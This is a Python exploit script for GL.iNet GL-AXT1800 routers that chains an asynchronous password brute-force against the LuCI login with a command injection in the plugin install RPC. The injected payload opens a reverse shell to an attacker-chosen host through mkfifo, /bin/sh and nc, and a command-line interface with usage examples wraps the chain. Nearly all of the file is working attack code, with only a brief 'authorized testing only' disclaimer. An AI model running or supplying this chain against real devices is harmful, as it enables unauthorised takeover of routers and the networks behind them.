#!/usr/bin/env python3
"""
GL.iNet Router Exploit Chain
Combines authentication bypass (brute-force) with authenticated RCE.

CVE-2025-67090: Authentication Bypass via Unrestricted Brute-Force
CVE-2025-67089: Authenticated Command Injection in Plugin Handler

Affected: GL-AXT1800 (Slate AX) firmware <= 4.6.8
Author: Aleksa Zatezalo
Date: November 2025

For authorized security research and penetration testing only.
"""

import argparse
import asyncio
import hashlib
import ipaddress
import sys
from pathlib import Path
from typing import Optional
from urllib.parse import urlencode

import aiohttp
import requests
from passlib.hash import md5_crypt, sha256_crypt, sha512_crypt

requests.packages.urllib3.disable_warnings()


# =============================================================================
# Configuration
# =============================================================================

DEFAULT_USERNAME = "root"
DEFAULT_CONCURRENCY = 10
DEFAULT_TIMEOUT = 10


def log(msg: str, prefix: str = "*"):
    """Print formatted log message."""
    print(f"[{prefix}] {msg}")


# =============================================================================
# Transport Layer
# =============================================================================

def build_rpc_request(method: str, params: dict, request_id: int = 1) -> dict:
    """Build JSON-RPC 2.0 request payload."""
    return {
        "jsonrpc": "2.0",
        "id": request_id,
        "method": method,
        "params": params
    }


def send_rpc(host: str, payload: dict, sid: Optional[str] = None, timeout: int = DEFAULT_TIMEOUT) -> dict:
    """Send RPC request and return parsed response."""
    url = f"http://{host}/rpc"
    headers = {"Content-Type": "application/json"}
    
    if sid:
        headers["Cookie"] = f"Admin-Token={sid}"
    
    response = requests.post(url, json=payload, headers=headers, timeout=timeout)
    response.raise_for_status()
    return response.json()


# =============================================================================
# Authentication Module
# =============================================================================

def get_challenge(host: str, username: str) -> dict:
    """Request authentication challenge from router."""
    payload = build_rpc_request("challenge", {"username": username})
    response = send_rpc(host, payload)
    
    if "error" in response:
        raise Exception(f"Challenge failed: {response['error']}")
    
    return response["result"]


def compute_auth_hash(username: str, password: str, challenge: dict) -> str:
    """Compute authentication hash using GL.iNet's algorithm."""
    salt = challenge["salt"]
    nonce = challenge["nonce"]
    alg = challenge["alg"]
    
    if alg == 1:
        pw_hash = md5_crypt.using(salt=salt).hash(password)
    elif alg == 5:
        pw_hash = sha256_crypt.using(salt=salt, rounds=5000).hash(password)
    elif alg == 6:
        pw_hash = sha512_crypt.using(salt=salt, rounds=5000).hash(password)
    else:
        raise ValueError(f"Unsupported algorithm: {alg}")
    
    combined = f"{username}:{pw_hash}:{nonce}"
    return hashlib.md5(combined.encode()).hexdigest()


def authenticate(host: str, username: str, password: str) -> str:
    """Authenticate and return session ID."""
    challenge = get_challenge(host, username)
    auth_hash = compute_auth_hash(username, password, challenge)
    
    payload = build_rpc_request("login", {
        "username": username,
        "hash": auth_hash
    })
    
    response = send_rpc(host, payload)
    
    if "error" in response:
        raise Exception(f"Login failed: {response['error']}")
    
    if "result" in response and "sid" in response["result"]:
        return response["result"]["sid"]
    
    raise Exception(f"Unexpected response: {response}")


# =============================================================================
# Brute-Force Module (CVE: Auth Bypass)
# =============================================================================

async def try_password(
    session: aiohttp.ClientSession,
    url: str,
    username: str,
    password: str,
    semaphore: asyncio.Semaphore
) -> Optional[str]:
    """Attempt single login. Returns password on success (302)."""
    async with semaphore:
        payload = urlencode({
            "luci_username": username,
            "luci_password": password
        })
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": url.rsplit("/", 2)[0],
            "Referer": url,
        }
        
        try:
            async with session.post(
                url,
                data=payload,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=DEFAULT_TIMEOUT)
            ) as response:
                if response.status == 302:
                    return password
                    
        except (asyncio.TimeoutError, aiohttp.ClientError):
            pass
        
        return None


async def brute_force_async(
    host: str,
    username: str,
    passwords: list,
    concurrency: int
) -> Optional[str]:
    """Execute async brute-force attack."""
    url = f"http://{host}/cgi-bin/luci"
    semaphore = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(
                try_password(session, url, username, pw, semaphore)
            )
            for pw in passwords
        ]
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                for t in tasks:
                    t.cancel()
                return result
    
    return None


def brute_force(
    host: str,
    username: str,
    passwords: list,
    concurrency: int = DEFAULT_CONCURRENCY
) -> Optional[str]:
    """Synchronous entry point for brute-force."""
    return asyncio.run(brute_force_async(host, username, passwords, concurrency))


def load_wordlist(filepath: Path) -> list:
    """Load passwords from wordlist file."""
    content = filepath.read_text(errors="ignore")
    passwords = [p.strip() for p in content.strip().split("\n") if p.strip()]
    return passwords


# =============================================================================
# Exploitation Module (CVE: Command Injection)
# =============================================================================

def build_reverse_shell_payload(lhost: str, lport: int) -> str:
    """Build reverse shell command injection payload."""
    return f'`mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc {lhost} {lport} > /tmp/p`'


def send_exploit(host: str, sid: str, lhost: str, lport: int) -> bool:
    """Inject reverse shell command via plugin handler."""
    payload = build_reverse_shell_payload(lhost, lport)
    
    rpc_payload = {
        "jsonrpc": "2.0",
        "id": 11,
        "method": "call",
        "params": [sid, "plugins", "install_package", {"name": [payload]}]
    }
    
    try:
        send_rpc(host, rpc_payload, sid=sid)
        return True
    except requests.exceptions.Timeout:
        return True  # Timeout expected - shell connecting
    except Exception:
        return False


# =============================================================================
# Attack Orchestration
# =============================================================================

def run_brute_force(
    rhost: str,
    wordlist: Path,
    username: str = DEFAULT_USERNAME,
    concurrency: int = DEFAULT_CONCURRENCY
) -> Optional[str]:
    """Stage 1: Brute-force password via LuCI."""
    log("Stage 1: Brute-Force Attack")
    log(f"Target: {rhost}")

    passwords = load_wordlist(wordlist)
    log(f"Loaded {len(passwords)} passwords")
    log("Brute forcing passwords")

    password = brute_force(rhost, username, passwords, concurrency)
    
    if password:
        log(f"Password found: {password}", "+")
    else:
        log("No valid password found", "-")
    
    return password


def run_authentication(
    rhost: str,
    username: str,
    password: str
) -> Optional[str]:
    """Stage 2: Obtain authenticated session."""
    log("Stage 2: Authentication")
    log(f"Authenticating as {username}...")
    
    try:
        sid = authenticate(rhost, username, password)
        log("Session obtained", "+")
        return sid
    except Exception as e:
        log(f"Authentication failed: {e}", "!")
        return None


def run_exploit(
    rhost: str,
    sid: str,
    lhost: str,
    lport: int
) -> bool:
    """Stage 3: Execute command injection."""
    log("Stage 3: Command Injection")
    log(f"Reverse shell -> {lhost}:{lport}")
    
    success = send_exploit(rhost, sid, lhost, lport)
    
    if success:
        log("Payload delivered - check listener", "+")
    else:
        log("Exploitation failed", "!")
    
    return success


def run_full_chain(
    rhost: str,
    lhost: str,
    lport: int,
    wordlist: Optional[Path] = None,
    password: Optional[str] = None,
    username: str = DEFAULT_USERNAME,
    concurrency: int = DEFAULT_CONCURRENCY
) -> bool:
    """Execute complete attack chain."""
    print("=" * 60)
    print("GL.iNet Exploit Chain")
    print("=" * 60 + "\n")
    
    # Get password via brute-force or use provided
    if password is None:
        if wordlist is None:
            log("Password or wordlist required", "!")
            return False
        password = run_brute_force(rhost, wordlist, username, concurrency)
        if not password:
            return False
        print()
    
    # Authenticate
    sid = run_authentication(rhost, username, password)
    if not sid:
        return False
    print()
    
    # Exploit
    return run_exploit(rhost, sid, lhost, lport)


# =============================================================================
# CLI Interface
# =============================================================================

def validate_ip(value: str) -> str:
    """Validate IP address argument."""
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {value}")


def validate_port(value: str) -> int:
    """Validate port number argument."""
    port = int(value)
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(f"Port must be 1-65535: {value}")
    return port


def validate_wordlist(value: str) -> Path:
    """Validate wordlist file argument."""
    path = Path(value)
    if not path.exists():
        raise argparse.ArgumentTypeError(f"File not found: {value}")
    return path


def build_parser() -> argparse.ArgumentParser:
    """Build argument parser."""
    parser = argparse.ArgumentParser(
        description="GL.iNet Router Exploit Chain (Auth Bypass + RCE)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  Full Chain    Brute-force -> Authenticate -> RCE (requires -w)
  Auth + RCE    Skip brute-force if password known (requires -p)
  Brute Only    Password discovery only (use --brute-only)

Examples:
  # Full chain with wordlist
  %(prog)s --rhost 192.168.8.1 --lhost 10.0.0.5 --lport 4444 -w passwords.txt

  # Skip brute-force with known password
  %(prog)s --rhost 192.168.8.1 --lhost 10.0.0.5 --lport 4444 -p admin123

  # Brute-force only
  %(prog)s --rhost 192.168.8.1 -w passwords.txt --brute-only

For authorized security testing only.
        """
    )
    
    target = parser.add_argument_group("Target")
    target.add_argument("--rhost", type=validate_ip, required=True, metavar="IP", help="Router IP address")
    target.add_argument("-u", "--username", default=DEFAULT_USERNAME, metavar="USER", help=f"Username (default: {DEFAULT_USERNAME})")
    
    auth = parser.add_argument_group("Authentication")
    auth_method = auth.add_mutually_exclusive_group()
    auth_method.add_argument("-p", "--password", metavar="PASS", help="Known password (skip brute-force)")
    auth_method.add_argument("-w", "--wordlist", type=validate_wordlist, metavar="FILE", help="Password wordlist for brute-force")
    
    exploit = parser.add_argument_group("Exploitation")
    exploit.add_argument("--lhost", type=validate_ip, metavar="IP", help="Listener IP for reverse shell")
    exploit.add_argument("--lport", type=validate_port, metavar="PORT", help="Listener port for reverse shell")
    
    options = parser.add_argument_group("Options")
    options.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, metavar="N", help=f"Concurrent brute-force requests (default: {DEFAULT_CONCURRENCY})")
    options.add_argument("--brute-only", action="store_true", help="Only perform brute-force (no RCE)")
    
    return parser


def main() -> int:
    """Main entry point."""
    parser = build_parser()
    args = parser.parse_args()
    
    # Validate mode requirements
    if not args.brute_only:
        if not args.lhost or not args.lport:
            parser.error("--lhost and --lport required for exploitation")
        if not args.password and not args.wordlist:
            parser.error("--password or --wordlist required")
    else:
        if not args.wordlist:
            parser.error("--wordlist required for brute-force mode")
    
    try:
        if args.brute_only:
            result = run_brute_force(
                args.rhost,
                args.wordlist,
                args.username,
                args.concurrency
            )
            return 0 if result else 1
        
        success = run_full_chain(
            rhost=args.rhost,
            lhost=args.lhost,
            lport=args.lport,
            wordlist=args.wordlist,
            password=args.password,
            username=args.username,
            concurrency=args.concurrency
        )
        
        print("\n" + "=" * 60)
        print("[+] Exploitation complete" if success else "[-] Exploitation failed")
        print("=" * 60)
        
        return 0 if success else 1
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        return 130
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
